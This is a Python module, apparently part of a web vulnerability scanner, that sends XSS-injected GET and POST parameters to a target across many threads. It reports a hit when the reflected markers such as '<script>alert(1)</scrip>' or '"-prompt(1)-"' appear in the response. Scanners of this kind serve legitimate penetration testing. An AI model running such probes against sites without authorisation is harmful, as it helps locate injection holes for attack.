# -*- coding: utf-8 -*-
import requests
from pub.com.outprint import ATPrintInfoSuc,ATPrintInfoPostSuc
from attack.Attack_Tihuan import attack_tihuan_url_canshu_work
from attack.Attack_Tihuan import post_attack_tihuan_url_canshu_work
from requests.packages.urllib3 import disable_warnings
from rich.progress import Progress
from concurrent.futures import ThreadPoolExecutor,as_completed,wait
disable_warnings()


class XssPoc:
    def xsscheck(self,url):
        # print(url)
        try:
            req = requests.get(url,headers=self.__headers,proxies=self.__proxies,verify=self.__ssl,timeout=self.__timeout)
            if "<script>alert(1)</scrip>" in req.text or '"-prompt(1)-"' in req.text:
                return True, url, "XSS Attack", req.request.headers
        except Exception:
            pass
    def xsscheck_post(self,url):
        baseurl = url.split("&attack&")[0]
        data = url.split("&attack&")[-1].strip("&")
        try:
            req = requests.post(baseurl,headers=self.__headers,proxies=self.__proxies,verify=self.__ssl,timeout=self.__timeout,data=data)
            if "<script>alert(1)</scrip>" in req.text or '"-prompt(1)-"' in req.text:
                return True, url, "XSS POST Attack", req.request.headers,req.request.body
        except Exception:
            pass
    def main(self,target,attack_url_list,progress,__craw_post_url_list):
        self.__attack_url_list = attack_tihuan_url_canshu_work(attack_url_list, "xss")
        # for i in self.__attack_url_list:
        #     print(i)
        if target['proxy']:
            if "://" in target['proxy']:
                self.__proxies = {"https": target['proxy'], "http": target['proxy']}
            else:
                self.__proxies = {"https": "http://" + target['proxy'], "http": "http://" + target['proxy']}
        else:
            self.__proxies = target['proxy']
        self.__headers = {"User-Agent":target['header']}
        self.__ssl = target['ssl']
        self.__threads = int(target['threads'])
        self.__timeout = int(target['timeout'])


        # with Progress(transient=True) as progress:
        tasks = progress.add_task("[b yellow]XSS检测...", total=len(self.__attack_url_list))
        with ThreadPoolExecutor(self.__threads) as pool:
            futures = [pool.submit(self.xsscheck, base_url) for base_url in self.__attack_url_list]
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    flag, suc_url, poc_name, req = result
                    ATPrintInfoSuc(suc_url, poc_name, req)
                progress.update(tasks, advance=1)
        wait(futures)

        post_att_url_list = post_attack_tihuan_url_canshu_work(target['url'], __craw_post_url_list, "xss")
        if post_att_url_list:
            tasks = progress.add_task("[b yellow]XSS POST检测...", total=len(post_att_url_list))
            with ThreadPoolExecutor(self.__threads) as pool:
                futures = [pool.submit(self.xsscheck_post, base_url) for base_url in post_att_url_list]
                for future in as_completed(futures):
                    result = future.result()
                    if result is not None:
                        flag, suc_url, poc_name, req, body = result
                        ATPrintInfoPostSuc(suc_url, poc_name, req, body)
                    progress.update(tasks, advance=1)
            wait(futures)

